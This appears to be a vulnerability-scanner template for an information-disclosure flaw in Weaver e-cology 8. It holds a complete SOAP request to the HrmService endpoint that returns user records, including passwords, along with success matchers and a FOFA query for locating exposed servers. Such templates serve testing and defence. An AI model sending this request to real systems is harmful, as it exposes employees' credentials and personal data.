tmp/microsoft/ecology-HrmService-info-disclosure.yaml

id: ecology-HrmService-info-disclosure

info:
  name: Weaver Ecology HrmService - Information Disclosure
  author: Co5mos
  severity: high
  description: |
    泛微e-cology 8 系统存在信息泄露漏洞，攻击者可通过 SOAP 请求获取用户敏感信息，包括用户名、密码、联系方式等。
  metadata:
    verified: true
    fofa-query: 'app="泛微-协同商务系统"'
  tags: weaver, oa, disclosure, ecology

http:
  - raw:
      - |
        POST /services/HrmService HTTP/1.1
        Host: {{Hostname}}
        Content-type: text/xml;charset=UTF-8
        SOAPAction: urn:weaver.hrm.webservice.HrmService.getHrmUserInfoXML

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrm="http://localhost/services/HrmService">
          <soapenv:Header/>
          <soapenv:Body>
            <hrm:getHrmUserInfoXML>
              <hrm:in0></hrm:in0>
              <hrm:in1></hrm:in1>
              <hrm:in2></hrm:in2>
              <hrm:in3></hrm:in3>
              <hrm:in4></hrm:in4>
              <hrm:in5>2024-07-30</hrm:in5>
            </hrm:getHrmUserInfoXML>
          </soapenv:Body>
        </soapenv:Envelope>

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body, "UserBean")
          - contains(body, "<soap:Envelope")
        condition: and
